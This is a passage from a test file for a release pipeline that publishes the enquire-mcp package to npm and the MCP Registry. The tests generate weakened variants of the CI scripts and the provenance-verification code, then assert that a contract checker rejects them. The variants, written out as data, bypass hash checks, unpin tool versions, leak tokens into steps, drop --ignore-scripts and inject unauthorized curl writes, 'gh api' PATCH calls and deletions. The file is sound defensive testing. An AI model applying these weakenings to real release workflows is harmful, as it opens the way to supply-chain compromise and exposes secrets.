          'HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin \\\n  ACTIONS_ID_TOKEN_REQUEST_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"',
          'HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin GH_TOKEN="$GH_TOKEN" \\\n  ACTIONS_ID_TOKEN_REQUEST_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin \\\n  "$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          'HOME="$MCP_REGISTRY_HOME" PATH=/usr/bin:/bin GH_TOKEN="$GH_TOKEN" \\\n  "$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"'
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, 'MCP_PUBLISHER_TAG="v1.7.9"', 'MCP_PUBLISHER_TAG="latest"')),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'MCP_PUBLISHER_SHA256="ab128162b0616090b47cf245afe0a23f3ef08936fdce19074f5ba0a4469281ac"',
          `MCP_PUBLISHER_SHA256="${"0".repeat(64)}"`
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, 'MCP_PUBLISHER_SIZE="7297012"', 'MCP_PUBLISHER_SIZE="0"')),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          `releases/download/\${MCP_PUBLISHER_TAG}/mcp-publisher_linux_amd64.tar.gz`,
          "releases/latest/download/mcp-publisher_linux_amd64.tar.gz"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '--max-filesize "$MCP_PUBLISHER_SIZE" --retry 0 --location --max-redirs 1',
          '--max-filesize "$MCP_PUBLISHER_SIZE" --retry 1 --location --max-redirs 1'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'if [ "$PUBLISHER_ENTRIES" != "mcp-publisher" ]; then',
          'if [ "$PUBLISHER_ENTRIES" = "mcp-publisher" ]; then'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '[ "$(/usr/bin/stat -c \'%s\' "$MCP_PUBLISHER_ARCHIVE")" != "$MCP_PUBLISHER_SIZE" ]',
          '[ "$(/usr/bin/stat -c \'%s\' "$MCP_PUBLISHER_ARCHIVE")" = "$MCP_PUBLISHER_SIZE" ]'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'printf \'%s  %s\\n\' "$MCP_PUBLISHER_SHA256" "$MCP_PUBLISHER_ARCHIVE" | /usr/bin/sha256sum -c -',
          "true # publisher hash verification bypassed"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'deadline_timeout 180 10 "MCP manifest validation"',
          'deadline_timeout 180 0 "MCP manifest validation"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "login github-oidc --registry=https://registry.modelcontextprotocol.io",
          "login none --registry=https://registry.modelcontextprotocol.io"
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, 'keys == ["method","registry","token"]', 'has("token")')),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '(.token | type) == "string" and (.token | length) > 0',
          '(.token | type) == "string"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          ': > "$body_file"\n  set +e\n  response=$(deadline_timeout 35 10',
          ': > "$body_file"\n  response=$(deadline_timeout 35 10'
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, '--rawfile exactBody "$exact_body"', '--arg exactBody "{}"')),
      registryStepWithRun(replaceExactly(registryRun, "MCP_PUBLISH_EXIT=0\nset +e", "MCP_PUBLISH_EXIT=0")),
      registryStepWithRun(replaceExactly(registryRun, "MCP_PUBLISH_EXIT=$?", "MCP_PUBLISH_EXIT=0")),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'assert_manifest_snapshots\ndeadline_timeout 180 10 "MCP manifest validation"',
          'deadline_timeout 180 10 "MCP manifest validation"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'if [ "$package_digest" != "$PACKAGE_JSON_SHA256" ] || [ "$server_digest" != "$SERVER_JSON_SHA256" ]; then',
          'if [ "$package_digest" != "$PACKAGE_JSON_SHA256" ] && [ "$server_digest" != "$SERVER_JSON_SHA256" ]; then'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "assert_manifest_snapshots\nassert_remote_tag_identity\nMCP_PUBLISH_ATTEMPTED=true",
          "assert_manifest_snapshots\nprintf '{}' > \"$SERVER_JSON_SNAPSHOT\"\n" +
            "assert_remote_tag_identity\nMCP_PUBLISH_ATTEMPTED=true"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "SECOND_RESULT=$(registry_snapshot preflight)",
          "SECOND_RESULT=$(registry_snapshot convergence)"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'echo "MCP Registry already exposes exact active/latest $MCP_NAME@$VERSION"\n  exit 0',
          'echo "MCP Registry already exposes exact active/latest $MCP_NAME@$VERSION"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'echo "MCP Registry converged before the sole publish boundary"\n  exit 0',
          'echo "MCP Registry converged before the sole publish boundary"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "assert_remote_tag_identity\nPREFLIGHT_RESULT=$(registry_snapshot preflight)",
          "PREFLIGHT_RESULT=$(registry_snapshot preflight)"
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, "MCP_PUBLISH_ATTEMPTED=true", "MCP_PUBLISH_ATTEMPTED=false")),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            '/usr/bin/env "$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            'env "$GH_BIN" api --method PATCH repos/oomkapwn/enquire-mcp'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            "command /usr/bin/gh api --method PATCH repos/oomkapwn/enquire-mcp"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\ncommand /usr/bin/gh --version'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            "/usr/bin/curl --disable https://registry.modelcontextprotocol.io/v0.1/servers"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            "command /usr/bin/curl --data '{}' https://registry.modelcontextprotocol.io/v0.1/servers"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            "command /usr/bin/curl --disable https://registry.modelcontextprotocol.io/v0.1/servers"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n' +
            "command /usr/bin/cu\\rl --disable https://registry.modelcontextprotocol.io/v0.1/servers"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n"$CURL_BIN" --request POST https://registry.modelcontextprotocol.io/v0.1/servers'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n"$CURL_BIN" -d \'{}\' https://registry.modelcontextprotocol.io/v0.1/servers'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          'response=$(deadline_timeout 35 10 "MCP Registry read" "$CURL_BIN" --disable \\',
          'response=$(deadline_timeout 35 10 "MCP Registry read" "$CURL_BIN" --disable -d\'{}\' \\'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "--silent --show-error --proxy '' --connect-timeout 10 --max-time 30 \\",
          `"\${WRITE_ARG:---data}" '{}' \\\n    ` +
            "--silent --show-error --proxy '' --connect-timeout 10 --max-time 30 \\"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n"$CURL_BIN" --json \'{}\' https://registry.modelcontextprotocol.io/v0.1/servers'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"',
          '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"\n"$MCP_PUBLISHER_BIN" delete "$MCP_NAME@$VERSION"'
        )
      ),
      registryStepWithRun(replaceExactly(registryRun, "for attempt in {1..12}; do", "for attempt in {1..1}; do")),
      registryStepWithRun(
        replaceExactly(
          replaceExactly(
            registryRun,
            'require_job_reserve 2200 "MCP Registry publish and convergence"',
            'for replay in {1..2}; do\n  require_job_reserve 2200 "MCP Registry publish and convergence"'
          ),
          'echo "MCP Registry exact publication is confirmed for $MCP_NAME@$VERSION"',
          'echo "MCP Registry exact publication is confirmed for $MCP_NAME@$VERSION"\ndone'
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          "MCP_REGISTRY_CONFIRMED=false",
          "MCP_REGISTRY_CONFIRMED=false\nMCP_REGISTRY_CONFIRMED=true"
        )
      ),
      registryStepWithRun(
        replaceExactly(
          registryRun,
          '[ "$MCP_PUBLISH_ATTEMPTED" != "true" ] || [ "$MCP_REGISTRY_CONFIRMED" != "true" ]',
          '[ "$MCP_PUBLISH_ATTEMPTED" != "true" ] && [ "$MCP_REGISTRY_CONFIRMED" != "true" ]'
        )
      )
    ];
    for (const weakenedRegistryStep of weakenedRegistrySteps) {
      expect(mcpRegistryStepProblems(weakenedRegistryStep, mcpbInputs.integrity)).toContain(
        MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM
      );
    }
    expect(
      mcpRegistryStepProblems(
        registryStep,
        replaceExactly(
          mcpbInputs.integrity,
          'phase === "convergence" && (status === 429 || status >= 500)',
          'phase === "convergence"'
        )
      )
    ).toContain(MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM);
    const provenanceWorkflowCompositionMutation = replaceExactly(
      mcpbInputs.release,
      NPM_PROVENANCE_CONTEXT_COMMAND,
      "true # provenance context bypassed"
    );
    const provenanceEvaluatorCompositionMutation = replaceExactly(
      mcpbInputs.integrity,
      'eventName: "push"',
      'eventName: "workflow_dispatch"'
    );
    expect(npmProvenanceContractProblems(provenanceWorkflowCompositionMutation, mcpbInputs.integrity)).toContain(
      NPM_PROVENANCE_CONTRACT_PROBLEM
    );
    expect(npmProvenanceContractProblems(mcpbInputs.release, provenanceEvaluatorCompositionMutation)).toContain(
      NPM_PROVENANCE_CONTRACT_PROBLEM
    );

    // Mutation oracle: workflow ordering, token isolation, exact verifier pin, and read-only convergence.
    for (const weakenedProvenanceWorkflow of [
      replaceExactly(
        mcpbInputs.release,
        'require_job_reserve 4500 "npm publish"',
        'require_job_reserve 2100 "npm publish"'
      ),
      replaceExactly(
        mcpbInputs.release,
        'require_job_reserve 2700 "token-free npm provenance verification"',
        'require_job_reserve 1200 "token-free npm provenance verification"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `PROVENANCE_SHA: \${{ github.sha }}`,
        `PROVENANCE_SHA: \${{ github.workflow_sha }}`
      ),
      replaceExactly(
        mcpbInputs.release,
        `      - name: ${NPM_PROVENANCE_STEP_NAME}`,
        "      - name: Skipped npm provenance"
      ),
      replaceExactly(
        mcpbInputs.release,
        `PUBLISH_ATTEMPTED: \${{ steps.npm_publication.outputs.publish_attempted }}`,
        'PUBLISH_ATTEMPTED: "false"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `          RELEASE_JOB_DEADLINE_EPOCH: \${{ steps.deadline.outputs.epoch }}\n` +
          `          EXPECTED_VERSION: \${{ steps.npm_publication.outputs.version }}\n` +
          `          EXPECTED_SOURCE_SHA: \${{ steps.npm_publication.outputs.source_sha }}\n` +
          `          EXPECTED_TAG: \${{ steps.npm_publication.outputs.tag }}\n` +
          `          EXPECTED_INTEGRITY: \${{ steps.npm_publication.outputs.integrity }}`,
        `          RELEASE_JOB_DEADLINE_EPOCH: 9999999999\n` +
          `          EXPECTED_VERSION: \${{ steps.npm_publication.outputs.version }}\n` +
          `          EXPECTED_SOURCE_SHA: \${{ steps.npm_publication.outputs.source_sha }}\n` +
          `          EXPECTED_TAG: \${{ steps.npm_publication.outputs.tag }}\n` +
          `          EXPECTED_INTEGRITY: \${{ steps.npm_publication.outputs.integrity }}`
      ),
      replaceExactly(mcpbInputs.release, '          NPM_TOKEN: ""', `          NPM_TOKEN: \${{ secrets.NPM_TOKEN }}`),
      replaceExactly(mcpbInputs.release, '          NPM_CLI_VERSION: "11.18.0"', '          NPM_CLI_VERSION: "latest"'),
      replaceExactly(
        mcpbInputs.release,
        '          NPM_CLI_URL: "https://registry.npmjs.org/npm/-/npm-11.18.0.tgz"',
        '          NPM_CLI_URL: "https://registry.npmjs.org/npm/-/npm-latest.tgz"'
      ),
      replaceExactly(
        mcpbInputs.release,
        `          NPM_CLI_SRI: "${NPM_PROVENANCE_CLI_SRI}"`,
        '          NPM_CLI_SRI: "sha512-unpinned"'
      ),
      replaceExactly(mcpbInputs.release, '          NPM_CLI_SIZE: "2997746"', '          NPM_CLI_SIZE: "0"'),
      replaceExactly(
        mcpbInputs.release,
        '          NPM_GLOBALCONFIG="$VERIFY_ROOT/global.npmrc"',
        '          NPM_GLOBALCONFIG="$VERIFY_ROOT/user.npmrc"'
      ),
      replaceExactly(
        mcpbInputs.release,
        '/usr/bin/touch "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"',
        '/bin/true "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"'
      ),
      replaceExactly(
        mcpbInputs.release,
        '/bin/chmod 600 "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"',
        '/bin/chmod 644 "$NPM_USERCONFIG" "$NPM_GLOBALCONFIG"'
      ),
      replaceExactly(
        mcpbInputs.release,
        '"NPM_CONFIG_USERCONFIG=$NPM_USERCONFIG"',
        '"NPM_CONFIG_USERCONFIG=/dev/null"'
      ),
      replaceExactly(mcpbInputs.release, '"NPM_CONFIG_PREFER_ONLINE=true"', '"NPM_CONFIG_PREFER_ONLINE=false"'),
      replaceExactly(mcpbInputs.release, "--max-filesize 4194304 --retry 0", "--max-filesize 4194304 --retry 1"),
      replaceExactly(mcpbInputs.release, '[ "$NPM_CLI_ACTUAL_SRI" != "$NPM_CLI_SRI" ]', "false"),
      replaceExactly(mcpbInputs.release, "$0 !~ /^package\\//", "false"),
      replaceExactly(mcpbInputs.release, "$0 ~ /(^|\\/)\\.\\.?(\\/|$)/", "false"),
      replaceExactly(mcpbInputs.release, "seen[$0]++", "false"),
      replaceExactly(mcpbInputs.release, 'NF == 0 || (substr($0, 1, 1) != "-" && substr($0, 1, 1) != "d")', "false"),
      replaceExactly(
        mcpbInputs.release,
        "--save-exact --package-lock=true --ignore-scripts --no-audit --no-fund --omit=optional",
        "--save-exact --package-lock=true --no-audit --no-fund --omit=optional"
      ),
      replaceExactly(
        mcpbInputs.release,
        '.packages["node_modules/@oomkapwn/enquire-mcp"].integrity == $integrity',
        '.packages["node_modules/@oomkapwn/enquire-mcp"].version == $version'
      ),
      replaceExactly(
        mcpbInputs.release,
        `              /usr/bin/env -i "\${CLEAN_NPM_ENV[@]}" \\\n                ${NPM_PROVENANCE_AUDIT_COMMAND}`,
        `              ${NPM_PROVENANCE_AUDIT_COMMAND}`
      ),
      replaceExactly(
        mcpbInputs.release,
        NPM_PROVENANCE_AUDIT_COMMAND,
        replaceExactly(NPM_PROVENANCE_AUDIT_COMMAND, " --kill-after=10s", "")
      ),
      replaceExactly(mcpbInputs.release, "--json --include-attestations --omit=optional", "--json --omit=optional"),
      replaceExactly(
        mcpbInputs.release,
        "--fetch-retries=0 --fetch-timeout=60000 --prefer-online",
        "--fetch-retries=0 --fetch-timeout=60000"
      ),
      replaceExactly(
        mcpbInputs.release,
        `/usr/bin/env -i "\${CLEAN_ENV[@]}" \\\n              ${NPM_PROVENANCE_EVALUATOR_COMMAND}`,
        `              ${NPM_PROVENANCE_EVALUATOR_COMMAND}`
      ),
      replaceExactly(
        mcpbInputs.release,
        NPM_PROVENANCE_EVALUATOR_COMMAND,
        replaceExactly(NPM_PROVENANCE_EVALUATOR_COMMAND, " --kill-after=5s", "")
      ),
      replaceExactly(
        mcpbInputs.release,
        "for (( attempt=1; attempt<=8; attempt++ )); do",
        "for (( attempt=1; attempt<=1; attempt++ )); do"
      ),
      replaceExactly(mcpbInputs.release, 'if [ "$attempt" -lt 8 ]; then', 'if [ "$attempt" -lt 7 ]; then'),
      replaceExactly(mcpbInputs.release, "attempt $attempt/8", "attempt $attempt/7"),
      replaceExactly(mcpbInputs.release, "              /bin/sleep 10", "              /bin/sleep 1"),
      replaceExactly(
        mcpbInputs.release,
        NPM_PROVENANCE_SUCCESS_CONDITION,
        '[ "$AUDIT_EXIT" -eq 0 ] || [ "$EVALUATOR_EXIT" -eq 0 ]'
      ),
      replaceExactly(mcpbInputs.release, MCPB_EXACT_NPM_PUBLISH, `${MCPB_EXACT_NPM_PUBLISH}\n${MCPB_EXACT_NPM_PUBLISH}`)
    ]) {
      expect(npmProvenanceWorkflowProblems(weakenedProvenanceWorkflow)).toContain(NPM_PROVENANCE_CONTRACT_PROBLEM);
    }

    // Mutation oracle: semantic evaluator source must retain every exact binding and fail-closed cardinality.
    for (const weakenedProvenanceEvaluator of [
      replaceExactly(mcpbInputs.integrity, "workflowSha: expectedSourceSha", "workflowSha: declared.workflowSha"),
      replaceExactly(mcpbInputs.integrity, "statement.subject.length !== 1", "statement.subject.length < 1"),
      replaceExactly(
        mcpbInputs.integrity,
        "subject.name !== expectedPurl || digest.sha512 !== expectedSha512",
        "subject.name !== expectedPurl && digest.sha512 !== expectedSha512"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "predicateType === NPM_PROVENANCE_IDENTITY.publishPredicateType",
        "predicateType === NPM_PROVENANCE_IDENTITY.slsaPredicateType"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        '["publicKey", "tlogEntries", "timestampVerificationData"]',
        '["x509CertificateChain", "tlogEntries", "timestampVerificationData"]'
      ),
      replaceExactly(mcpbInputs.integrity, "verified.tlogEntries.length === 0", "false"),
      replaceExactly(mcpbInputs.integrity, "!isRecord(verified.timestampVerificationData)", "false"),
      replaceExactly(
        mcpbInputs.integrity,
        "/^SHA256:[A-Za-z0-9+/]{43}$/u.test(publicKey.hint)",
        'publicKey.hint.startsWith("SHA256:")'
      ),
      replaceExactly(mcpbInputs.integrity, "keyid !== publicKey.hint", "false"),
      replaceExactly(mcpbInputs.integrity, "chain.certificates.length !== 1", "chain.certificates.length < 1"),
      replaceExactly(
        mcpbInputs.integrity,
        "decodeCanonicalBase64(certificate.rawBytes",
        "Buffer.from(certificate.rawBytes"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'import { X509Certificate } from "node:crypto";',
        "const X509Certificate = undefined;"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "leafCertificate = new X509Certificate(certificateDer);",
        `leafCertificate = { subjectAltName: \`URI:\${expectedSignerUri}\` };`
      ),
      replaceExactly(
        mcpbInputs.integrity,
        `leafCertificate.subjectAltName !== \`URI:\${expectedSignerUri}\``,
        "!leafCertificate.subjectAltName?.includes(expectedSignerUri)"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'const FULCIO_GITHUB_ACTIONS_ISSUER = "https://token.actions.githubusercontent.com";',
        'const FULCIO_GITHUB_ACTIONS_ISSUER = "https://token.actions.githubusercontent.dev";'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'const FULCIO_ISSUER_OID_LEGACY = Buffer.from("2b0601040183bf300101", "hex");',
        'const FULCIO_ISSUER_OID_LEGACY = Buffer.from("2b0601040183bf300108", "hex");'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'const FULCIO_ISSUER_OID_V2 = Buffer.from("2b0601040183bf300108", "hex");',
        'const FULCIO_ISSUER_OID_V2 = Buffer.from("2b0601040183bf300101", "hex");'
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "field.tag !== 0xa3 || field.next !== tbs.contentEnd",
        "field.tag !== 0xa3 && field.next !== tbs.contentEnd"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "extensions.tag !== 0x30 || extensions.next !== field.contentEnd",
        "extensions.tag !== 0x30 && extensions.next !== field.contentEnd"
      ),
      replaceExactly(mcpbInputs.integrity, "legacyIssuerCount > 1", "legacyIssuerCount > 2"),
      replaceExactly(mcpbInputs.integrity, "v2IssuerCount > 1", "v2IssuerCount > 2"),
      replaceExactly(
        mcpbInputs.integrity,
        "legacyIssuerCount + v2IssuerCount === 0",
        "legacyIssuerCount + v2IssuerCount < 0"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "assertExactFulcioOidcIssuer(certificateDer, label);",
        "certificateDer.includes(FULCIO_ISSUER_OID_LEGACY);"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        `\`\${NPM_PROVENANCE_IDENTITY.workflowPath}@refs/tags/\${expected.tag}\``,
        `\`\${NPM_PROVENANCE_IDENTITY.workflowPath}@refs/heads/\${expected.tag}\``
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "decodeNpmAttestationWrapper(target.attestationBundles[index], index, expectedSignerUri)",
        'decodeNpmAttestationWrapper(target.attestationBundles[index], index, "")'
      ),
      replaceExactly(mcpbInputs.integrity, "    expectedSignerUri,\n    label\n  );", '    "",\n    label\n  );'),
      replaceExactly(mcpbInputs.integrity, 'keyid !== ""', "false"),
      replaceExactly(
        mcpbInputs.integrity,
        "statement.predicateType !== item.predicateType",
        "statement.predicateType === item.predicateType"
      ),
      replaceExactly(mcpbInputs.integrity, "report.invalid.length !== 0", "report.invalid.length < 0"),
      replaceExactly(mcpbInputs.integrity, "report.missing.length !== 0", "report.missing.length < 0"),
      replaceExactly(
        mcpbInputs.integrity,
        "report.verified.filter((entry) => entry.name === expected.name)",
        "report.verified.filter((entry) => entry.name.includes(expected.name))"
      ),
      replaceExactly(mcpbInputs.integrity, "targets.length !== 1", "targets.length < 1"),
      replaceExactly(
        mcpbInputs.integrity,
        "target.attestationBundles.length !== 2",
        "target.attestationBundles.length < 1"
      ),
      replaceExactly(mcpbInputs.integrity, "statements.has(decoded.predicateType)", "false"),
      replaceExactly(
        mcpbInputs.integrity,
        "const statement = decodeCanonicalBase64Json",
        "const statement = JSON.parse"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        'assertCanonicalPositiveDecimal(invocationMatch[1], "signed npm provenance run id")',
        "invocationMatch[1]"
      ),
      replaceExactly(
        mcpbInputs.integrity,
        "expected.publishAttempted && (runId !== expected.currentRunId || runAttempt !== expected.currentRunAttempt)",
        "false"
      )
    ]) {
      expect(npmProvenanceEvaluatorProblems(weakenedProvenanceEvaluator)).toContain(NPM_PROVENANCE_CONTRACT_PROBLEM);
    }

    expect(assertMcpbAssetVersion("4.0.0-rc.2")).toBe("4.0.0-rc.2");
    expect(() => assertMcpbAssetVersion("4.0.0-rc.2+rebuilt.1")).toThrow(/build metadata/);
    expect(assertChannelVersionAdvance("4.0.0", "-", "latest")).toBe("4.0.0");
    expect(assertChannelVersionAdvance("4.0.0", "3.11.7", "latest")).toBe("4.0.0");
    expect(assertChannelVersionAdvance("4.10.0", "4.9.99", "latest")).toBe("4.10.0");
    expect(assertChannelVersionAdvance("4.0.0-rc.2", "4.0.0-rc.1", "rc")).toBe("4.0.0-rc.2");
    expect(assertChannelVersionAdvance("4.0.0-rc.10", "4.0.0-rc.9", "rc")).toBe("4.0.0-rc.10");
    expect(assertChannelVersionAdvance("4.1.0-rc.0", "4.0.0-rc.99", "rc")).toBe("4.1.0-rc.0");
    expect(() => assertChannelVersionAdvance("4.0.0", "4.0.0", "latest")).toThrow(/does not advance/);
    expect(() => assertChannelVersionAdvance("3.11.7", "4.0.0", "latest")).toThrow(/roll latest back/);
    expect(() => assertChannelVersionAdvance("4.0.0-rc.1", "4.0.0-rc.2", "rc")).toThrow(/roll rc back/);
    expect(() => assertChannelVersionAdvance("4.0.0-rc.2", "3.11.7", "latest")).toThrow(/resolves to rc/);
    expect(() => assertChannelVersionAdvance("4.0.0", "3.11.7-rc.1", "latest")).toThrow(/resolves to rc/);
    expect(() => assertChannelVersionAdvance("4.0.0-rc.02", "4.0.0-rc.1", "rc")).toThrow(/leading zero/);
    expect(() => assertChannelVersionAdvance("4.0.0+build.1", "3.11.7", "latest")).toThrow(/build metadata/);

    const npmIntegrity = `sha512-${"A".repeat(86)}==`;
    const otherNpmIntegrity = `sha512-C${"A".repeat(85)}==`;
    const otherSourceSha = "352c54c0e0d4939c9f7b93470a4a2d7c7a0ac78c";
    expect(evaluateNpmPublication({ exists: false }, TRUSTED_SOURCE_SHA, npmIntegrity, "4.0.0-rc.2", "rc")).toEqual({
      action: "publish"
    });
    for (const state of [
      { exists: true, integrity: npmIntegrity, channelVersion: "4.0.0-rc.2" },
      { exists: true, gitHead: null, integrity: npmIntegrity, channelVersion: "4.0.0-rc.2" },
      { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.0-rc.2" }
    ]) {
      expect(evaluateNpmPublication(state, TRUSTED_SOURCE_SHA, npmIntegrity, "4.0.0-rc.2", "rc")).toEqual({
        action: "reuse"
      });
    }
    for (const gitHead of ["", " ".repeat(40), undefined, 42, {}, "source", otherSourceSha]) {
      expect(() =>
        evaluateNpmPublication(
          { exists: true, gitHead, integrity: npmIntegrity, channelVersion: "4.0.0-rc.2" },
          TRUSTED_SOURCE_SHA,
          npmIntegrity,
          "4.0.0-rc.2",
          "rc"
        )
      ).toThrow(/gitHead/);
    }
    for (const integrity of [
      undefined,
      null,
      "",
      `sha1-${"A".repeat(27)}=`,
      `sha256-${"A".repeat(86)}==`,
      "sha512-not-base64",
      otherNpmIntegrity
    ]) {
      expect(() =>
        evaluateNpmPublication(
          { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity, channelVersion: "4.0.0-rc.2" },
          TRUSTED_SOURCE_SHA,
          npmIntegrity,
          "4.0.0-rc.2",
          "rc"
        )
      ).toThrow(/tarball integrity/);
    }
    for (const expectedIntegrity of [
      undefined,
      null,
      "",
      "sha256-not-sha512",
      "sha512-not-base64",
      `sha512-${"B".repeat(86)}==`
    ]) {
      expect(() =>
        evaluateNpmPublication({ exists: false }, TRUSTED_SOURCE_SHA, expectedIntegrity, "4.0.0-rc.2", "rc")
      ).toThrow(/canonical SHA-512 SRI/);
    }
    expect(() => evaluateNpmPublication({ exists: false }, "source", npmIntegrity, "4.0.0-rc.2", "rc")).toThrow(
      /exact lowercase SHA-1/
    );
    for (const malformedState of [null, [], {}, { exists: "false" }]) {
      expect(() =>
        evaluateNpmPublication(malformedState, TRUSTED_SOURCE_SHA, npmIntegrity, "4.0.0-rc.2", "rc")
      ).toThrow(/explicitly present or absent/);
    }
    expect(() =>
      evaluateNpmPublication(
        { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.0-rc.1" },
        TRUSTED_SOURCE_SHA,
        npmIntegrity,
        "4.0.0-rc.2",
        "rc"
      )
    ).toThrow(/roll rc back/);
    expect(
      evaluateNpmPublication(
        { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.0-rc.3" },
        TRUSTED_SOURCE_SHA,
        npmIntegrity,
        "4.0.0-rc.2",
        "rc"
      )
    ).toEqual({ action: "reuse_superseded", channelVersion: "4.0.0-rc.3" });
    expect(() =>
      evaluateNpmPublication(
        { exists: true, gitHead: TRUSTED_SOURCE_SHA, integrity: npmIntegrity, channelVersion: "4.0.1" },
        TRUSTED_SOURCE_SHA,
        npmIntegrity,
